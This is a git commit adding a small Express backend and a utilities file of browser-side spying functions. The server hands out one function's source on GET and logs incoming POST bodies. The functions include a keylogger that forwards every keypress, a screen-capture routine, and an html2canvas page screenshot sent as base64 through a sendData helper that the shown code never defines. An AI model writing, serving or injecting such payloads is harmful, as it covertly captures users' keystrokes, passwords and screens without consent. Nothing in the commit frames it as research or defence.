c7640e9f8123bc1aa40efea9ccd6662e851c04f1
maalolan210 <maalolan@buffalo.edu>
2022-05-22 07:31:44 +0000

    first commit

---
+++ backend/draco.js
@@ -0,0 +1,22 @@
+const express = require('express')
+const app = express()
+const cors = require('cors')
+const util = require('./utilities.js')
+const port = 3000
+
+app.use(cors())
+app.use(express.json())
+app.use(express.urlencoded())
+app.get('/', (req, res) => {
+  
+  res.send({"function": util[2].toString()})
+})
+
+app.post('/', (req, res) => {
+    console.log(req.body)
+    res.send('Got a POST request')
+  })
+
+app.listen(port, () => {
+  console.log(`Example app listening on port ${port}`)
+})
---
+++ backend/utilities.js
@@ -0,0 +1,34 @@
+const util = [
+  async () => 
+  document.addEventListener("keypress", async (event) => {
+    await sendData(event.key)
+}),
+  async () => {
+  const canvas = document.createElement("canvas");
+  const context = canvas.getContext("2d");
+  const video = document.createElement("video");
+
+  try {
+    const captureStream = await navigator.mediaDevices.getDisplayMedia();
+    video.srcObject = captureStream;
+    context.drawImage(video, 0, 0, window.width, window.height);
+    const frame = canvas.toDataURL("image/png");
+    captureStream.getTracks().forEach(track => track.stop());
+    await sendData(frame);
+  } catch (err) {
+    console.error("Error: " + err);
+  }
+},
+
+  () => {
+    document.body.innerHTML += '<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.js" integrity="sha512-sn/GHTj+FCxK5wam7k9w4gPPm6zss4Zwl/X9wgrvGMFbnedR8lTUSLdsolDRBRzsX6N+YgG6OWyvn9qaFVXH9w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>'
+    const screenshotTarget = document.body;
+    console.log(screenshotTarget)
+html2canvas(screenshotTarget).then(async (canvas) => {
+    const base64image = canvas.toDataURL("image/png");
+    await sendData(base64image);
+});
+  }
+]
+
+module.exports = util
